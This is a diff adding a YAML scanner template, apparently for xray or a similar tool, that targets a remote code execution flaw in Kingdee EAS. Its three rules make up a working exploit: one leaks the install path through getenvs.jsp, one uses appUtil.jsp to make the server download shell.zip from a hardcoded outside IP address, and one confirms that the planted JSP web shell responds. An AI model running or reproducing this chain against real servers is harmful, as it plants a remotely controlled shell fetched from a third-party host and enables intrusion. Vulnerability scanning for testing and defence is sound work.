@@ -1,0 +1,29 @@
+id: kingdee-eas-rce
+
+info:
+  name: 金蝶 EAS RCE
+  author: zhizhuo
+  severity: high
+  verified: true
+  
+rules:
+  r0:
+    request:
+      method: GET
+      path: /easportal/tools/getenvs.jsp
+    expression: response.status == 200 && response.raw.bcontains(b'EAS_HOME')
+    output:
+      search: '"<td align=\"left\" valign=\"top\">EAS_HOME</td>
+          <td align=\"left\" valign=\"top\">(?P<eashome>.+?)</td>".bmatches(response.body)'
+      eashome: search["eashome"]
+  r1:
+    request:
+      method: GET
+      path: /easportal/tools/appUtil.jsp?EAS_HOME=/kingdee/eas&type=Rabb&downloadUrl=http://121.37.66.33:16868/shell.zip
+    expression: response.status == 200
+  r2:
+    request:
+      method: GET
+      path: /easportal/tools/deploy/qaxnbshell.jsp
+    expression: response.status == 200
+expression: r0() && r1() && r2()
